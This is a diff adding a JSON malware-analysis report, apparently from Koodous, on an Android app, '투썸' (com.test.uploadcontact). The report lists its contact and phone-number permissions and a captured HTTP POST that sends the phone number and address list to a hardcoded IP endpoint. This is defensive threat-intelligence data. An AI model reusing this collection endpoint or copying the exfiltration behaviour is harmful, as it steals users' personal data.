@@ -1,0 +1,208 @@
+{
+    "apk_info": {
+        "id": "gYMNdMJlb3x1ZRDo",
+        "url": "https://developer.koodous.com/apks/337dd82be8191b56beeebc98ce8ab32534e8d62341a999822f1c99703afcf826/",
+        "sha256": "337dd82be8191b56beeebc98ce8ab32534e8d62341a999822f1c99703afcf826",
+        "md5": "cdd15706fe96a014f96de5cd0d326ae3",
+        "sha1": "7049a2b4be24375a0c829ec9afac845fb7b53fd1",
+        "app": "투썸",
+        "package_name": "com.test.uploadcontact",
+        "company": "Android",
+        "version": "1.5",
+        "image": null,
+        "size": 25094,
+        "tags": [],
+        "is_trusted": false,
+        "is_installed": false,
+        "rating": -2,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 10,
+        "comments_count": 0,
+        "votes_count": 2,
+        "created_at": "2019-12-07T15:31:02+01:00",
+        "updated_at": "2023-03-30T18:48:25.033094+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "cdd15706fe96a014f96de5cd0d326ae3",
+                    "sha1": "7049a2b4be24375a0c829ec9afac845fb7b53fd1",
+                    "size": 25094,
+                    "crc32": "43662619",
+                    "sha256": "337dd82be8191b56beeebc98ce8ab32534e8d62341a999822f1c99703afcf826",
+                    "sha512": "9ac41cee8a8057c4f25bbf8940d09ced9f9857a6431943a4a41289101c5b59be46f93bf34ecbbecd94a1c8e172536fc37d6af6e9dc4602f784441a5206e9acec",
+                    "ssdeep": "384:/Us7cwQVWggeqNLo52ZaVsXafjUgTFeBmy61CHDj:csTQ3geq1AHV7oO661Wf"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [],
+                "irc": [],
+                "http": [
+                    {
+                        "uri": "http://107.151.194.116:8080/JYSystem/restInt/collect/postData",
+                        "body": "{\"addressList\":\"[]\",\"phoneNumber\":\"15555215554\",\"createTime\":\"1\",\"phoneSystem\":\"and\"}",
+                        "data": "POST /JYSystem/restInt/collect/postData HTTP/1.1\r\naccept: */*\r\nContent-Type: application/json;charset=utf-8\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 107.151.194.116:8080\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nContent-Length: 85\r\n\r\n{\"addressList\":\"[]\",\"phoneNumber\":\"15555215554\",\"createTime\":\"1\",\"phoneSystem\":\"and\"}",
+                        "host": "107.151.194.116:8080",
+                        "path": "/JYSystem/restInt/collect/postData",
+                        "port": 8080,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    }
+                ],
+                "smtp": [],
+                "hosts": [
+                    "107.151.194.116"
+                ],
+                "domains": []
+            }
+        },
+        "androguard": {
+            "urls": [
+                "http://107.151.194.116:8080/JYSystem/restInt/collect/postData"
+            ],
+            "dexes": {
+                "classes": {
+                    "sha256": "f2d815ec105a0b278c98b9903adadbeebd6fa27a17b16c0db99e5528988ddf25",
+                    "ssdeep": "192:duyTl4C3uaLiz1RxZUDe97KEx9eDLRS2LhbKRa:pTl4C3uaKv7UDsx9OFSkga"
+                }
+            },
+            "api_key": {},
+            "cordova": "",
+            "filters": [
+                "android.intent.action.MAIN"
+            ],
+            "app_name": "투썸",
+            "services": [],
+            "wearable": false,
+            "androidtv": false,
+            "libraries": [],
+            "providers": [],
+            "receivers": [],
+            "activities": [
+                "com.test.uploadcontact.MainActivity"
+            ],
+            "certificate": {
+                "sha1": "61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81",
+                "serial": "936EACBE07F201DF",
+                "issuerDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_after": "Jul 17 01:33:46 2035 GMT",
+                "subjectDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_before": "Feb 29 01:33:46 2008 GMT"
+            },
+            "permissions": [
+                "android.permission.READ_PHONE_NUMBERS",
+                "android.permission.READ_PHONE_STATE",
+                "android.permission.INTERNET",
+                "android.permission.READ_CONTACTS"
+            ],
+            "package_name": "com.test.uploadcontact",
+            "version_code": "5",
+            "main_activity": "com.test.uploadcontact.MainActivity",
+            "signature_name": "META-INF/CERT.RSA",
+            "functionalities": {
+                "socket": [
+                    {
+                        "code": "invoke-virtual v2, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;",
+                        "class": "Lcom/test/uploadcontact/HttpUtil;",
+                        "method": "httpPostJSON"
+                    }
+                ],
+                "phonenumber": [
+                    {
+                        "code": "invoke-virtual v3, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/test/uploadcontact/MainActivity;",
+                        "method": "onCreate"
+                    },
+                    {
+                        "code": "invoke-virtual v3, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/test/uploadcontact/MainActivity;",
+                        "method": "onCreate"
+                    }
+                ]
+            },
+            "max_sdk_version": "",
+            "min_sdk_version": 15,
+            "new_permissions": [],
+            "displayed_version": "1.5",
+            "target_sdk_version": 8
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "107.151.194.116",
+                    "hostname": "107.151.194.116"
+                }
+            ],
+            "recvnet": [
+                {
+                    "pid": 851,
+                    "tid": 705530856,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Sat, 07 Dec 2019 14:42:02 GMT\r\n\r\n2c\r\n{\"res\":1,\"resMsg\":\"保存成功\",\"obj\":null}\r\n0\r\n\r\n",
+                    "time": 1.310037,
+                    "srchost": "107.151.194.116",
+                    "srcport": 8080,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "sendnet": [
+                {
+                    "pid": 851,
+                    "tid": 705530856,
+                    "data": "POST /JYSystem/restInt/collect/postData HTTP/1.1\r\naccept: */*\r\nContent-Type: application/json;charset=utf-8\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 107.151.194.116:8080\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nContent-Length: 85\r\n\r\n{\"addressList\":\"[]\",\"phoneNumber\":\"15555215554\",\"createTime\":\"1\",\"phoneSystem\":\"and\"}",
+                    "time": 1.063484,
+                    "dataleak": [
+                        "TAINT_PHONE_NUMBER"
+                    ],
+                    "desthost": "107.151.194.116",
+                    "destport": 8080,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "sendsms": [],
+            "dexclass": [
+                {
+                    "pid": 851,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 0.141052,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 851,
+                    "tid": 1073870640,
+                    "data": "504b0506000000001300130012060000de5b00000000504b01021400140008080800375c5d3874468bb360030000440a0000130000000000000000000000000000000000416e64726f69644d616e69666573742e786d6c504b01021400140008080800375c5d387ab9e94693140000002a00000b00000000000000000000000000a1030000636c61737365732e646578504b01021400140008080800375c5d3823099d0cd60300004016000032000000000000000000000000006d1800007265732f6472617761626c652d616e796470692d7632312f69635f6c61756e636865725f6261636b67726f756e642e786d6c504b01021400140000080000375c5d389700424f79010000790100002f00000000000000000000000000a31c00007265732f6472617761626c652d686470692d76342f69635f6c61756e636865725f6261636b67726f756e642e706e67504b01021400140000080000375c5d38c5abb4f8ca000000ca0000002f00020000000000000000000000691e00007265732f6472617761626c652d6c6470692d76342f69635f6c61756e636865725f6261636b67726f756e642e706e670000504b01021400140000080000375c5d3840ba3a43d5000000d50000002f00010000000000000000000000821f00007265732f6472617761626c652d6d6470692d76342f69635f6c61756e636865725f6261636b67",
+                    "name": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 0.20081,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [],
+            "fileswritten": [
+                {
+                    "pid": 851,
+                    "tid": 705854392,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"count\" value=\"1\" />\n</map>\n",
+                    "name": "/data/data/com.test.uploadcontact/shared_prefs/config.xml",
+                    "time": 1.367124,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "servicestart": []
+        }
+    }
+}
